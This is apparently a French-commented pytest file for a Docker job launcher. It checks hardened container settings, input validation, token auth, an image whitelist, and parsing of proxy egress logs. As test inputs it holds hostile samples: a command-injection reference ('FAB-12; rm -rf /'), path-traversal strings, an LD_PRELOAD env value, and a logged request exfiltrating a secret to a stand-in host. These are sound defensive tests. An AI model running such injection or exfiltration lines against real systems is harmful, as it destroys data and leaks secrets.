"""Launcher : la politique des conteneurs de jobs est figée et non négociable ; il n'agit que sur ses propres conteneurs."""
import json, threading, urllib.request
import pytest
from lanceur import main as L


class FakeImage:
    def __init__(self, tag):
        self.tags = [tag]


class FakeContainer:
    def __init__(self, name, labels, status="running", image="registre/fabrique-runner:sha-test"):
        self.name, self.labels, self.status, self.id = name, labels, status, name
        self.removed, self.image = False, FakeImage(image)

    def start(self):
        self.status = "running"

    def remove(self, force=False):
        self.removed = True


class FakeAPI:
    def __init__(self):
        self.execs = []

    def exec_create(self, cid, cmd, **kw):
        self.execs.append((cid, cmd, kw))
        return {"Id": f"x{len(self.execs)}"}

    def exec_start(self, eid, stream=False, demux=False):
        return iter([(b"ligne 1\nligne 2\n", None), (None, b"attention\n")]) if stream else b""

    def exec_inspect(self, eid):
        return {"ExitCode": 0}


class FakeDocker:
    def __init__(self):
        self.api, self.runs, self.store = FakeAPI(), [], {}

    class _C:
        def __init__(self, outer):
            self.o = outer

        def get(self, name):
            if name not in self.o.store:
                raise KeyError(name)
            return self.o.store[name]

        def run(self, image, cmd, **kw):
            self.o.runs.append((image, cmd, kw))
            c = FakeContainer(kw["name"], kw["labels"], image=image)
            self.o.store[kw["name"]] = c
            return c

    @property
    def containers(self):
        return FakeDocker._C(self)


@pytest.fixture
def lz(monkeypatch):
    monkeypatch.setattr(L, "IMAGE", "registre/fabrique-runner:sha-test")
    monkeypatch.setattr(L, "IMAGES", {"python": "registre/fabrique-runner:sha-test", "node": "registre/fabrique-job-node:abc"})
    d = FakeDocker()
    return L.Launcher(d), d


def test_policy_is_fixed(lz):
    l, d = lz
    l.start("FAB-12")
    image, cmd, kw = d.runs[0]
    assert image == "registre/fabrique-runner:sha-test" and cmd == ["sleep", "infinity"]
    assert kw["user"] == "10002:10002" and kw["cap_drop"] == ["ALL"] and kw["read_only"] is True and kw["privileged"] is False
    assert "no-new-privileges:true" in kw["security_opt"] and kw["pids_limit"] > 0 and kw["mem_limit"] and kw["nano_cpus"] > 0
    assert kw["network"] == "fabrique-jobs" and kw["labels"] == {"fabrique.job": "FAB-12"}
    assert list(kw["volumes"]) == ["/opt/volumes/fabrique-runner/FAB-12"]           # un seul montage : l'espace de ce job
    assert kw["volumes"]["/opt/volumes/fabrique-runner/FAB-12"]["bind"] == "/work/FAB-12"
    assert "/var/run/docker.sock" not in json.dumps(kw)


@pytest.mark.parametrize("ref", ["../etc", "fab-1", "FAB-1/../x", "", "FAB-12; rm -rf /", "X" * 30 + "-1"])
def test_job_reference_is_validated(lz, ref):
    with pytest.raises(L.Refused):
        lz[0].start(ref)


def test_never_touches_containers_it_did_not_create(lz):
    l, d = lz
    d.store["fabrique-job-fab-7"] = FakeContainer("fabrique-job-fab-7", {"autre": "x"})
    for action in (l.stop, l.kill):
        with pytest.raises(L.Refused):
            action("FAB-7")
    with pytest.raises(L.Refused):
        l.exec_stream("FAB-7", {"argv": ["id"]}, lambda o: None)


@pytest.mark.parametrize("body,msg", [({"argv": "id"}, "commande"), ({"argv": []}, "commande"), ({"argv": ["id"], "env": {"LD_PRELOAD": "x"}}, "LD_PRELOAD"),
                                      ({"argv": ["id"], "env": {"bad-key": "x"}}, "variable"), ({"argv": ["id"], "workdir": "/work/FAB-1/../FAB-2"}, "dossier"),
                                      ({"argv": ["id"], "workdir": "/etc"}, "dossier")])
def test_exec_requests_are_validated(lz, body, msg):
    l, d = lz
    l.start("FAB-1")
    with pytest.raises(L.Refused, match=msg):
        l.exec_stream("FAB-1", body, lambda o: None)


def test_exec_runs_as_agent_and_streams(lz):
    l, d = lz
    l.start("FAB-1")
    out = []
    l.exec_stream("FAB-1", {"argv": ["pytest", "-q"], "env": {"HOME": "/work/FAB-1/home"}, "workdir": "/work/FAB-1/repo"}, out.append)
    assert out == [{"o": "ligne 1\nligne 2\n"}, {"e": "attention\n"}, {"exit": 0}]
    cid, cmd, kw = d.api.execs[-1]
    assert kw["user"] == "10002:10002" and kw["workdir"] == "/work/FAB-1/repo"


def test_kill_spares_pid_one_and_stop_removes(lz):
    l, d = lz
    l.start("FAB-1")
    l.kill("FAB-1")
    assert d.api.execs[-1][1] == ["kill", "-9", "-1"]
    l.stop("FAB-1")
    assert d.store["fabrique-job-fab-1"].removed


def test_http_requires_token(monkeypatch, lz):
    monkeypatch.setattr(L, "TOKEN", "t" * 40)
    import socket
    s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
    threading.Thread(target=L.serve, args=(lz[0], "127.0.0.1", port), daemon=True).start()
    import time; time.sleep(0.3)

    def post(path, token):
        req = urllib.request.Request(f"http://127.0.0.1:{port}{path}", data=b"{}", headers={"Authorization": f"Bearer {token}"})
        try:
            return urllib.request.urlopen(req, timeout=5).status
        except urllib.error.HTTPError as e:
            return e.code
    assert post("/jobs/FAB-3/start", "mauvais") == 403
    assert post("/jobs/FAB-3/start", "t" * 40) == 200
    assert post("/jobs/../start", "t" * 40) in (400, 404)


def test_image_is_chosen_from_whitelist_only(lz):
    l, d = lz
    with pytest.raises(L.Refused):
        l.start("FAB-3", "registre/malveillant:latest")                     # jamais une image arbitraire
    assert l.start("FAB-3", "node")["image"] == "node" and d.runs[-1][0] == "registre/fabrique-job-node:abc"
    old = d.store[L.name_of("FAB-3")]
    assert l.start("FAB-3", "node")["reused"]                                 # même image : conteneur réutilisé
    r = l.start("FAB-3", "python")                                            # autre langage : conteneur neuf
    assert old.removed and not r["reused"] and d.runs[-1][0] == "registre/fabrique-runner:sha-test"


JOURNAL = """CONNECT   Nov 18 22:46:14.854 [1]: Connect (file descriptor 4): 10.0.0.7
CONNECT   Nov 18 22:46:14.854 [1]: Request (file descriptor 4): CONNECT pypi.org:443 HTTP/1.1
INFO      Nov 18 22:46:14.854 [1]: No upstream proxy for pypi.org
CONNECT   Nov 18 22:46:14.858 [1]: Established connection to host "pypi.org" using file descriptor 5.
CONNECT   Nov 18 22:46:14.868 [1]: Connect (file descriptor 6): 10.0.0.9
CONNECT   Nov 18 22:46:14.868 [1]: Request (file descriptor 6): CONNECT pypi.org:443 HTTP/1.1
CONNECT   Nov 18 22:46:14.868 [1]: Connect (file descriptor 4): 10.0.0.7
CONNECT   Nov 18 22:46:14.868 [1]: Request (file descriptor 4): GET https://example.com/ HTTP/1.1
NOTICE    Nov 18 22:46:14.868 [1]: Proxying refused on filtered domain "example.com"
CONNECT   Nov 18 22:46:14.869 [1]: Connect (file descriptor 4): 10.0.0.7
CONNECT   Nov 18 22:46:14.869 [1]: Request (file descriptor 4): GET http://Exfil.Example.org/vol?d=secret HTTP/1.1
NOTICE    Nov 18 22:46:14.869 [1]: Proxying refused on filtered domain "exfil.example.org"
CONNECT   Nov 18 22:46:15.100 [1]: Connect (file descriptor 4): 10.0.0.7
CONNECT   Nov 18 22:46:15.100 [1]: Request (file descriptor 4): CONNECT files.pythonhosted.org:443 HTTP/1.1
CONNECT   Nov 18 22:46:15.200 [1]: Connect (file descriptor 4): 10.0.0.7
CONNECT   Nov 18 22:46:15.200 [1]: Request (file descriptor 4): CONNECT pypi.org:443 HTTP/1.1
"""


def test_egress_reads_the_real_tinyproxy_log_per_client():
    """Format relevé sur un vrai proxy : chaque job ne voit que SES sorties ; refusé = suivi d'un « Proxying refused »."""
    r = L.egress(JOURNAL, "10.0.0.7")
    assert r == {"known": True, "allowed": [["pypi.org", 2], ["files.pythonhosted.org", 1]],
                 "denied": [["example.com", 1], ["exfil.example.org", 1]]}
    assert L.egress(JOURNAL, "10.0.0.9") == {"known": True, "allowed": [["pypi.org", 1]], "denied": []}
    assert L.egress(JOURNAL, "10.0.0.1") == {"known": True, "allowed": [], "denied": []} and "secret" not in str(r)


def test_net_reads_only_the_proxy_log_for_its_own_job(lz, monkeypatch):
    l, d = lz
    l.start("FAB-12")
    c = d.store[L.name_of("FAB-12")]
    c.attrs = {"NetworkSettings": {"Networks": {L.NETWORK: {"IPAddress": "10.0.0.7"}}}, "State": {"StartedAt": "2026-11-18T22:46:00.123456789Z"}}
    asked = {}

    class Proxy:
        def logs(self, **kw):
            asked.update(kw)
            return JOURNAL.encode()
    monkeypatch.setattr(l, "_proxy", lambda: Proxy())
    r = l.net("FAB-12")
    assert r["denied"] == [["example.com", 1], ["exfil.example.org", 1]] and asked["since"].year == 2026
    monkeypatch.setattr(l, "_proxy", lambda: None)
    assert l.net("FAB-12") == {"known": False}                                    # proxy introuvable : pas de ligne Réseau
    with pytest.raises(L.Refused):
        l.net("FAB-99")
